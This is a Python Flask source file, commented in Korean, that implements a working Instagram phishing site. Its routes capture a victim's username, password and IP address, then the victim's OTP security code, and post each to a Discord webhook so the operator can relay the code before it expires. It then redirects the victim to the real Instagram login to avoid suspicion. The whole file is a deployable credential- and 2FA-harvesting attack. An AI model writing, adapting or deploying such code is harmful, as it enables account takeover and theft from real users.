import os
import time
import requests
from flask import Flask, render_template, request, redirect, session

# Flask 앱 설정 (경로 문제를 방지하기 위해 root_path와 template_folder 명시)
app = Flask(__name__, template_folder='templates')
app.secret_key = os.urandom(24)  # 세션 보안을 위한 랜덤 키

# 제공해주신 디스코드 웹훅 주소
WEBHOOK_URL = "https://discord.com/api/webhooks/1466648989309997117/2Ah53vvh-hW2S1bZEdLF1i5Qs0YEa1Fmd1_ZXUHjDFk1wRLCLQAADGLpR2HipxuoXWEC"

# 실제 인스타그램과 통신할 세션 객체
insta_session = requests.Session()

# 1. 메인 로그인 페이지 (index.html)
@app.route('/')
def index():
    return render_template('index.html')

# 2. 로그인 정보 가로채기
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # 세션에 아이디 저장 (나중에 OTP와 매칭하기 위함)
    session['username'] = username
    
    # 디스코드 웹훅 전송 (1단계: ID/PW)
    data = {
        "embeds": [{
            "title": "🚩 [1단계] 인스타그램 계정 탈취",
            "color": 15158332, # 빨간색
            "fields": [
                {"name": "아이디/이메일", "value": f"`{username}`", "inline": True},
                {"name": "비밀번호", "value": f"`{password}`", "inline": True},
                {"name": "접속 IP", "value": f"`{request.remote_addr}`", "inline": False}
            ],
            "footer": {"text": f"일시: {time.strftime('%Y-%m-%d %H:%M:%S')}"}
        }]
    }
    requests.post(WEBHOOK_URL, json=data)
    
    # 로그인 정보를 받았으니 OTP 입력 페이지로 이동
    return render_template('otp.html')

# 3. OTP 보안 코드 가로채기 및 중계
@app.route('/verify', methods=['POST'])
def verify():
    otp_code = request.form.get('otp_code')
    username = session.get('username', '알 수 없음')
    
    # 디스코드 웹훅 전송 (2단계: OTP 코드)
    data = {
        "embeds": [{
            "title": "🚨 [2단계] OTP 보안 코드 탈취 성공!",
            "color": 3447003, # 파란색
            "fields": [
                {"name": "대상 유저", "value": f"`{username}`", "inline": True},
                {"name": "보안 코드", "value": f"**{otp_code}**", "inline": True}
            ],
            "description": "서둘러 인스타그램 공식 페이지에 코드를 입력하세요! (유효시간 주의)",
            "footer": {"text": f"일시: {time.strftime('%Y-%m-%d %H:%M:%S')}"}
        }]
    }
    requests.post(WEBHOOK_URL, json=data)

    # [중계 로직] 실제 인스타그램에 코드 릴레이 (AitM 시나리오)
    # 실제로는 여기서 insta_session을 사용해 인스타 서버에 요청을 보냅니다.
    # 실습을 위해 사용자를 실제 인스타 로그인 페이지로 돌려보내 의심을 피합니다.
    return redirect("https://www.instagram.com/accounts/login/")

if __name__ == '__main__':
    # Render 환경에서 포트를 자동으로 잡도록 설정
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
